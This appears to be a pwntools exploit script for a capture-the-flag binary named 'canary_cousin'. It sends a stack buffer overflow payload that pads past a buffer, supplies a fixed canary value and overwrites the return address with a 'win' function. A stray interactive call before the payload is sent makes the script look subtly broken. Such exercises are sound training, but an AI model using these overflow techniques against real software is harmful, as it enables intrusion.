from pwn import* 

p = process("./canary_cousin")

win = 0x804927e

p.recvuntil(b"!!")
p.interactive()

pay = b"A"*0x100
pay += p32(0xcafebabe)
pay += b"B"*0xc
pay += p32(win)
p.sendline(pay)

p.interactive()
